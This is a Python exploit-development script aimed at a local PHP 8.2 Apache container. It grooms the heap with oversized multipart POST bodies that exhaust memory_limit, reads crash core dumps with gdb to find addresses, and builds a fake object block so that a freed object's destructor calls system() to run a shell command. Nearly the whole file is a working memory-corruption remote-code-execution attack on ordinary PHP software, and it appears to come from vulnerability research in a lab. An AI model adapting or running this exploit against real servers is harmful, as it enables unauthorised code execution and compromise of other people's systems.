#!/usr/bin/env python3
"""oom132: CUT-ADJACENT NAME-SEA ARM (complete model).

Census (scan131, regex K{2048,}(\\d+)\\x00): registry name strings + freed
temp copies = ~1730 x 3064B chunks, idx 0..863, one 2MB region; stale tail
starts right after the LAST name chunk -> tail seed = the last parsed
names' bytes (K*8 rdi = idx-863's name). Cut idx ~863 = memory_limit
exhaustion point (varies per boot).

Design:
- measure: names 700..999 = SIG8 tiles (16B, NUL-free) -> freed temps of
  the parts just below the cut seed the tail w/ SIG8; part 830 value =
  tag8(830) (alive zval -> intact in core) -> A = value chunk addr.
- census each measure core: max name idx M (regex) -> sea window for arm.
- arm: names (M-80)..M = B||B tiles -> tail seed = B||B -> rdi = B;
  part 830 value = block at OFF (same-envelope name shrink 1536).
- B = A + OFF (legal slide). rdi = B -> rc 1->0 -> rc_dtor -> store_del
  -> free_obj(B) = system -> /tmp/x.
"""
import re, struct, subprocess, time, urllib.request, urllib.error
import payload68 as P

HOST = "http://127.0.0.1:8083"
STOCK_MD5 = "ce1f3c48ba22f8f17834ac791aead613"
ZIF = 0x39B8A0
CMD = b"whoami>/tmp/x"
MAGIC = 0xC0DEBA5E
SIG8 = struct.pack("<Q", 0x51E2C0DE51E2C0DE)
T16 = SIG8 + struct.pack("<Q", 0xDFE2C0DE51E2C0DF)  # 16B period, NUL-free: q mod 16 readable
KEYLEN = P.KEYLEN
K1 = 4200
TAG_PART = 830
SEA_LO, SEA_HI = 700, 1000        # measure-round tile window (superset)
VLEN = 1537
CORE = "/tmp/core.132"

def get(url, timeout=90):
    try:
        return 200, urllib.request.urlopen(url, timeout=timeout).read(200000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(200000).decode("utf-8", "replace")
    except Exception as e:
        return -1, "ERR %s" % type(e).__name__

def sh(cmd, timeout=120):
    r = subprocess.run(["docker", "exec", "php_vuln", "sh", "-c", cmd],
                       capture_output=True, timeout=timeout)
    return (r.stdout + r.stderr).decode("latin1").strip()

def x_state():
    return sh("test -f /tmp/x && echo X_EXISTS:$(cat /tmp/x) || echo NO_X").strip()

def segv_count():
    r = subprocess.run(["docker", "logs", "php_vuln"], capture_output=True, timeout=120)
    return len(re.findall(r"exit signal Segmentation", (r.stdout + r.stderr).decode("latin1", "replace")))

def recreate():
    subprocess.run(["docker", "rm", "-f", "php_vuln"], capture_output=True)
    subprocess.run(["docker", "run", "-d", "--name", "php_vuln", "-p", "8083:80",
                    "-v", "/tmp/phplab:/var/www/html",
                    "-v", "/tmp/phplab/oom1worker.conf:/etc/apache2/conf-enabled/oom1worker.conf",
                    "-v", "/tmp/phplab/30-oomlab.ini:/usr/local/etc/php/conf.d/30-oomlab.ini",
                    "--cap-add", "SYS_PTRACE", "--ulimit", "core=-1",
                    "php:8.2.34-apache"], capture_output=True)
    for _ in range(40):
        time.sleep(1.5)
        c, _o = get(HOST + "/oom_sapi.php", timeout=8)
        if c == 200:
            return True
    return False

def post_mod(body, timeout=300):
    req = urllib.request.Request(HOST + "/oom_mod.php", data=body,
                                 headers={"Content-Type": "multipart/form-data; boundary=BOUND"})
    try:
        return 200, urllib.request.urlopen(req, timeout=timeout).read(300).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(300).decode("utf-8", "replace")
    except Exception as e:
        return -1, "ERR %s" % type(e).__name__

def base_now():
    c, o = get(HOST + "/oom_probe.php?libphp=1")
    m = re.search(r"libphp=0x([0-9a-f]+)", o)
    return int(m.group(1), 16) if m else None

def cell_of(addr):
    return struct.pack("<Q", addr) * 2

def tag8(i):
    return struct.pack("<QQ", MAGIC + i, MAGIC + i)

def name_of(i, tile=None, shrink=0):
    if tile is not None:
        fill = ((KEYLEN - 8 - shrink) // 16) * 16
        filler = (tile * (fill // len(tile) + 1))[:fill]
    else:
        filler = b"K" * (KEYLEN - 8 - shrink)
    return (b'--BOUND\r\nContent-Disposition: form-data; name="p' + filler
            + b"%d" % i + b'[x]"\r\n\r\n')

def value_of(i, B=None, OFF=0, with_block=False, tag=False):
    if with_block and i == TAG_PART:
        v = bytearray(cell_of(B) * (VLEN // 16) + b"P")
        st = struct.pack_into
        st("<II", v, OFF + 0x00, 1, 0x108)
        st("<II", v, OFF + 0x08, 1, 0)
        st("<Q", v, OFF + 0x10, 0)
        st("<Q", v, OFF + 0x18, B + 0x68)
        st("<I", v, OFF + 0x2C, 1)
        st("<Q", v, OFF + 0x50, B + 0x90)
        v[OFF + 0x58] = 6
        st("<I", v, OFF + 0x5C, 0x106)
        st("<Q", v, OFF + 0x68, 0)
        st("<Q", v, OFF + 0x70, BASE + ZIF)
        st("<IIQI", v, OFF + 0x90, 1, 0x106, 0, len(CMD))
        v[OFF + 0xA8: OFF + 0xA8 + len(CMD) + 1] = CMD + b"\x00"
        for s in range(0, len(v) - 15, 16):
            if not (OFF <= s < OFF + 0xB8):
                v[s:s + 16] = cell_of(B)
        return bytes(v)
    if tag:
        return tag8(i) + b"v" * (VLEN - 32) + tag8(i)
    return b"v"

NU_LPROBE = b"NULPROBE\x00POSTNUL"

def build_post(sea_tile=None, tile_lo=SEA_LO, tile_hi=SEA_HI,
               B=None, OFF=0, with_block=False, tag=False, nulprobe=False):
    ps = []
    for i in range(K1):
        if nulprobe and i == 500:
            fill = KEYLEN - 8 - len(NU_LPROBE) - 3
            ps.append(b'--BOUND\r\nContent-Disposition: form-data; name="p'
                      + b"K" * fill + NU_LPROBE + b"500" + b'[x]"\r\n\r\n'
                      + value_of(i) + b"\r\n")
            continue
        intile = tile_lo <= i < tile_hi and sea_tile is not None
        shrink = 1536 if (i == TAG_PART and (tag or with_block)) else 0
        ps.append(name_of(i, tile=(sea_tile if intile else None), shrink=shrink)
                  + value_of(i, B=B, OFF=OFF, with_block=with_block,
                             tag=(tag and i == TAG_PART)) + b"\r\n")
    ps += [P.poison_part(n, 5000000 + n * P.CELLS) for n in range(P.PREP)]
    ps.append(b"--BOUND--\r\n")
    return b"".join(ps)

def fire(tag, body, tries=6, want_crash=True):
    for t in range(tries):
        sh("rm -f /tmp/core /tmp/core.used")
        n0 = segv_count()
        c, r = post_mod(body)
        crashed = False
        for _ in range(10):
            time.sleep(2)
            if segv_count() > n0 or sh("test -f /tmp/core && echo y") == "y":
                crashed = True
                break
        print("%s try%d: http=%s segv+%d core=%s"
              % (tag, t, c, segv_count() - n0,
                 sh("test -f /tmp/core && echo y") == "y"), flush=True)
        if crashed == want_crash:
            return crashed, c, r
        if crashed and not want_crash and x_state().startswith("X_EXISTS"):
            return crashed, c, r
    return crashed, c, r

def pull_core(dst):
    subprocess.run(["docker", "cp", "php_vuln:/tmp/core", "/tmp/core.tmp"], capture_output=True)
    subprocess.run(["docker", "cp", "/tmp/core.tmp", "phpbuild:" + dst], capture_output=True)
    subprocess.run(["docker", "cp", "phpbuild:" + dst, "/tmp/scan_core"], capture_output=True)

def segs_of(mm):
    e_phoff = struct.unpack_from("<Q", mm, 0x20)[0]
    e_phentsize, e_phnum = struct.unpack_from("<HH", mm, 0x36)
    out = []
    for i in range(e_phnum):
        off = e_phoff + i * e_phentsize
        pt = struct.unpack_from("<I", mm, off)[0]
        po, pv, pa, pf = struct.unpack_from("<QQQQ", mm, off + 8)
        if pt == 1 and pf > 0x10000:
            out.append((pv, po, pf))
    return out

def census_and_tag(segs, mm):
    """max registry-name idx + tag addr. Fast: scan once per seg."""
    m4 = struct.pack("<Q", MAGIC + TAG_PART)
    tag = None
    maxidx = -1
    pat = re.compile(rb"K{2048,}(\d{1,5})\x00")
    for pv, po, pf in segs:
        d = mm[po:po + pf]
        j = d.find(m4)
        if j >= 0 and tag is None:
            tag = pv + j
        for m in pat.finditer(d):
            idx = int(m.group(1))
            if idx > maxidx and idx < 4200:
                maxidx = idx
    return maxidx, tag

def core_rdi(corepath):
    subprocess.run(["docker", "exec", "phpbuild", "sh", "-c",
                    'printf "set pagination off\\nset confirm off\\ninfo registers rdi rbx rip\\nquit\\n" > /tmp/g132.gdb'],
                    capture_output=True)
    r = subprocess.run(["docker", "exec", "phpbuild", "sh", "-c",
                        "gdb -q -batch -x /tmp/g132.gdb /tmp/libphp.stock.so %s 2>&1 | grep -E '^rdi|^rbx|^rip'" % corepath],
                       capture_output=True, timeout=240)
    return r.stdout.decode("latin1").strip()

def aim(A):
    for o in range(24, VLEN - 0xB8, 8):
        cand = A + o
        if cand & 0xF == 8 and (cand >> 8) & 1 == 1 and (cand >> 9) & 1 == 0:
            nb = cand.to_bytes(6, "little")
            if not any(b in (0x00, 0x0A, 0x0D, 0x22, 0x27, 0x5C, 0x3B, 0x3D) for b in nb):
                return cand, o
    return None, None

print("=== oom132: cut-adjacent name-sea arm ===", flush=True)
assert recreate(), "recreate failed"
md5 = sh("md5sum /usr/lib/apache2/modules/libphp.so | cut -d' ' -f1")
assert md5 == STOCK_MD5, "not stock: " + md5
print("md5 ok", flush=True)

for k1 in P.K1S[:-1]:
    post_mod(P.build_attack(k1, 5000000))
print("shaped segv=%d" % segv_count(), flush=True)
BASE = base_now()
print("base=0x%x" % BASE, flush=True)
print("pre x: %s" % x_state(), flush=True)

m_body = build_post(sea_tile=T16, tag=True, nulprobe=True)
verbatim = P.build_attack(4200, 5000000)
print("m=%.2fMB delta=%d" % (len(m_body) / 1048576.0, len(m_body) - len(verbatim)), flush=True)

B = None; OFF = None; q = None
for rnd in range(1, 5):
    print("--- r%d (B=%s OFF=%s) ---" % (rnd, B and hex(B), OFF), flush=True)
    if B is None:
        crashed, c, r = fire("r%d-meas" % rnd, m_body)
        xs = x_state()
        print("r%d-meas x: %s" % (rnd, xs), flush=True)
        if xs.startswith("X_EXISTS"):
            print("!!! CAMPAIGN WON (meas r%d): %s" % (rnd, xs), flush=True)
            break
        if not crashed:
            print("r%d-meas no crash" % rnd, flush=True)
            continue
        pull_core("%s_r%dm" % (CORE, rnd))
        rdi_txt = core_rdi("%s_r%dm" % (CORE, rnd))
        print("r%d-meas gdb: %s" % (rnd, rdi_txt), flush=True)
        import mmap
        f = open("/tmp/scan_core", "rb")
        mm = mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ)
        segs = segs_of(mm)
        maxidx, tag = census_and_tag(segs, mm)
        sigs = []
        for pv, po, pf in segs:
            d = mm[po:po + pf]; s = 0
            while True:
                j = d.find(SIG8, s)
                if j < 0:
                    break
                sigs.append(pv + j); s = j + 1
        mm.close(); f.close()
        print("census: maxidx=%d tag=%s sig8hits=%d" % (maxidx, tag and hex(tag), len(sigs)), flush=True)
        f2 = open("/tmp/scan_core", "rb"); d2 = f2.read(); f2.close()
        nulok = d2.find(NU_LPROBE) >= 0
        print("nulprobe: contig=%d post=%d -> NULs survive names: %s"
              % (d2.count(NU_LPROBE), d2.count(b"POSTNUL"), nulok), flush=True)
        q = None
        mrdi = re.search(r"rdi\s+0x([0-9a-f]+)", rdi_txt)
        if mrdi:
            rb = struct.pack("<Q", int(mrdi.group(1), 16))
            ring = T16 + T16
            q = next((i for i in range(16) if ring[i:i + 8] == rb), None)
        print("phase q=%s" % q, flush=True)
        if tag:
            B, OFF = aim(tag)
            print("ARM aim from tag: B=%s OFF=%s" % (B and hex(B), OFF), flush=True)
        if B is None:
            print("no tag anchor", flush=True)
            continue
        if not nulok:
            print("ARM ABORTED: names truncate at NUL -> pivot to warm-value sea", flush=True)
            break
    if B is not None:
        t = cell_of(B)
        rotB = t if q is None else bytes(t[(k - q) % 16] for k in range(16))
        a_body = build_post(sea_tile=rotB, tile_lo=max(0, maxidx - 80),
                            tile_hi=min(maxidx + 1, 1000), B=B, OFF=OFF, with_block=True)
        assert abs(len(a_body) - len(m_body)) <= 8, "envelope drift %d" % (len(a_body) - len(m_body))
        crashed, c, r = fire("r%d-arm" % rnd, a_body, want_crash=False)
        xs = x_state()
        print("r%d-arm x: %s" % (rnd, xs), flush=True)
        if xs.startswith("X_EXISTS"):
            print("!!! CAMPAIGN WON (arm r%d): %s" % (rnd, xs), flush=True)
            break
        if crashed:
            pull_core("%s_r%da" % (CORE, rnd))
            print("r%d-arm gdb: %s" % (rnd, core_rdi("%s_r%da" % (CORE, rnd))), flush=True)

print("final x: %s" % x_state(), flush=True)
print("=== done ===", flush=True)
